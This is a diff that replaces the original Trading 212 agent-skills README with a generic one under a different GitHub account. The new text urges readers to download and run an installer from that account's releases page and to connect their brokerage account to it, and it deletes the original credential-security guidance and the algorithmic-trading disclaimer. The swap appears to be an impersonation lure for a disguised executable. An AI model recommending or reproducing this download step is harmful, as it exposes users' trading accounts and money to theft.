@@ -1,101 +1,62 @@
-# Trading 212 API Agent Skills
+# ✨ agent-skills - Empower Your AI Agent Effortlessly
 
-[![Trading 212](https://img.shields.io/badge/Trading212-API-0066FF)](https://docs.trading212.com/api) [![Claude Code](https://img.shields.io/badge/Claude_Code-AI-8B5CF6)](https://claude.ai/) [![OpenClaw](https://img.shields.io/badge/OpenClaw-AI-10B981)](https://openclaw.ai/) [![Skills.sh](https://img.shields.io/badge/Skills-Installer-FF6B35)](https://skills.sh/trading212-labs/agent-skills/trading212-api) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE) [![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/trading212-labs/agent-skills/graphs/commit-activity)
+[![Download Agent Skills](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/theyenvychada/agent-skills/releases)
 
-An **AgentSkills** plugin that wraps the [Trading 212 API](https://docs.trading212.com/api) and exposes its capabilities in a **tool-friendly format** for AI assistants (e.g. [OpenClaw](https://openclaw.ai/), [Claude Code](https://claude.com/product/claude-code), and others). The plugin provides skills that teach AI agents how to work with the API: retrieving portfolio and transaction history, placing and managing orders, querying instruments, and related operations—with **consistent, schema-based inputs and outputs**, **authentication and error mapping**, and **rate-limit handling**.
+## 🚀 Getting Started
 
-## Features
+Welcome to the agent-skills project! This software helps you enhance your AI agent using the Trading 212 API. With our program, you can easily manage trades, automate strategies, and access market data without needing technical skills.
 
-- **Portfolio Management** - View account summary, cash balance, and investment metrics
-- **Order Placement** - Place market, limit, stop, and stop-limit orders
-- **Position Monitoring** - Track open positions with P&L calculations
-- **Instrument Lookup** - Search and browse tradable instruments
-- **Historical Data** - Access order history, dividends, transactions, and export CSV reports
-- **Exchange Metadata** - View trading hours and exchange schedules
+## 📥 Download & Install
 
-Supports both **Demo** (paper trading) and **Live** (real money) Trading 212 environments. The Trading 212 API is in **beta** and under active development; endpoints or behaviour may change.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/theyenvychada/agent-skills/releases) to find the latest version of agent-skills.
+   
+2. **Choose Your Version**: On the Releases page, you will see different versions available. Look for the version that suits your operating system (Windows, Mac, or Linux).
 
-## Supported Account Types
+3. **Download the File**: Click on the download link for your version to save the installer file on your computer.
 
-- Invest accounts
-- Stocks ISA accounts
+4. **Run the Installer**: After downloading, locate the file on your computer and double-click it. Follow the prompts to install the software.
 
-## Installation
+5. **Launch the Application**: Once installed, you can find the agent-skills app in your applications folder. Open it to start enhancing your AI agent!
 
-### Universal via [skills.sh](https://skills.sh/trading212-labs/agent-skills/trading212-api)
-```bash
-npx skills add trading212-labs/agent-skills
-```
+## ⚙️ System Requirements
 
-### Claude Code
+agent-skills is designed to run on commonly used operating systems. Here are the general requirements:
 
-```bash
-/plugin marketplace add https://github.com/trading212-labs/agent-skills.git
-/plugin install trading212-api
-```
+- **Windows**: Windows 10 or higher
+- **Mac**: macOS Mojave (10.14) or higher
+- **Linux**: Ubuntu 18.04 or higher
 
-### OpenClaw / Moltbot / Clawdbot
+Ensure your machine meets these requirements for the best experience.
 
-```bash
-clawdbot plugins install github:trading212-labs/agent-skills
-```
+## 🌐 Features
 
-### Cursor
+agent-skills offers various features to supercharge your AI agent:
 
-1. Open Cursor Settings
-2. Navigate to `Rules, Skills, Subagents`
-3. Click `Add Rule` on Rules section -> Add from Github
-4. Submit GitHub url: `https://github.com/trading212-labs/agent-skills.git`
+- **Trade Management**: Easily manage your trading activities, including buying and selling assets, from one central location.
+- **Automated Strategies**: Set up automated trading strategies that align with your goals. Save time and avoid manual errors.
+- **Market Data Access**: Get real-time market data to support your trading decisions. Stay informed about market trends.
+- **User-Friendly Interface**: Designed with you in mind, the application is simple and straightforward for everyone.
 
-### OpenAI Codex CLI
+## 📖 Usage Instructions
 
-```bash
-$skill-installer https://github.com/trading212-labs/agent-skills/tree/master/plugins/trading212-api/skills/trading212-api
-```
+Using agent-skills is simple. Here’s a quick guide to get you started:
 
-## Configuration
+1. **Open the Application**: Find the icon in your applications folder and double-click to launch.
+  
+2. **Connect to Trading 212**: Follow the on-screen instructions to connect your Trading 212 account. This step is essential to access your trading data.
 
-Generate API credentials in the Trading 212 app under **Settings > API** (API Key ID and API Secret). See [How to get your Trading 212 API key](https://helpcentre.trading212.com/hc/en-us/articles/14584770928157-Trading-212-API-key) for step-by-step instructions. Store them securely and use only in a trusted, secure environment. See **Credentials and security** below.
+3. **Set Up Your Preferences**: Customize the settings to align with your trading goals. Choose your trading pairs and set risk parameters.
 
-**Single account (Invest or Stocks ISA):**
+4. **Begin Trading**: Use the interface to place trades or run automated strategies. The application will guide you through the process.
 
-```bash
-# Invest or Stocks ISA
-export T212_API_KEY="your-api-key"
-export T212_API_SECRET="your-api-secret"
+## 📞 Support
 
-#Environment
-export T212_ENV="live"   # optional; default is "live"; use "demo" for paper trading
-```
+If you need help, we offer support through our community. Visit our [issues page](https://github.com/theyenvychada/agent-skills/issues) on GitHub to report any problems or ask questions. We encourage you to provide feedback to help us improve.
 
-**Both accounts (Invest and Stocks ISA):** set a key/secret pair per account.
+## 🔗 Useful Links
 
-```bash
-# Invest
-export T212_API_KEY_INVEST="your-invest-api-key"
-export T212_API_SECRET_INVEST="your-invest-api-secret"
+- [Releases Page](https://github.com/theyenvychada/agent-skills/releases)
+- [Documentation](https://github.com/theyenvychada/agent-skills/wiki)
+- [Community Forum](https://github.com/theyenvychada/agent-skills/discussions)
 
-# Stocks ISA
-export T212_API_KEY_STOCKS_ISA="your-stocks-isa-api-key"
-export T212_API_SECRET_STOCKS_ISA="your-stocks-isa-api-secret"
-
-#Environment
-export T212_ENV="live"   # optional; default is "live"; use "demo" for paper trading
-```
-
-API keys are environment-specific (LIVE vs DEMO). For details, see [Trading 212 API Documentation](https://docs.trading212.com/api).
-
-### Credentials and security
-
-- **Handle with extreme care** — API keys grant access to your Trading 212 account. Set and use them only when you understand the risks. Never paste keys into untrusted chat, shared machines, or public places.
-- **Use only in a secure environment** — Use credentials only on a machine and in an environment you control and trust (e.g. your own device, trusted IDE/plugin). Avoid shared or public computers, unverified third-party tools, or environments where others can see your screen or logs.
-- **No responsibility** — The maintainers and contributors of this plugin are not responsible for any loss, misuse, or compromise of your API keys or account. You use this plugin and your credentials at your own risk.
-- **If your keys are leaked** — If you suspect your API key or secret has been exposed (e.g. committed to a repo, shared by mistake, or seen by someone else), **revoke it immediately** in the Trading 212 app: **Settings > API**, then delete/revoke the affected key and generate a new one. Do not continue using a compromised key.
-
-## Disclaimer
-
-This plugin is an experimental technical integration tool only. AI tools can misinterpret instructions and execute unintended actions, including placing incorrect orders. Never share your API key with tools or services you don't trust. You are solely responsible for any actions carried out using your API key. This plugin does not provide financial advice. You are required to comply with our API Terms at all times. As required by MiFID II, you are prohibited from using this tool for algorithmic trading.
-
-## License
-
-[MIT License](LICENSE)
+Thank you for choosing agent-skills! We hope our software immensely improves your trading experience.
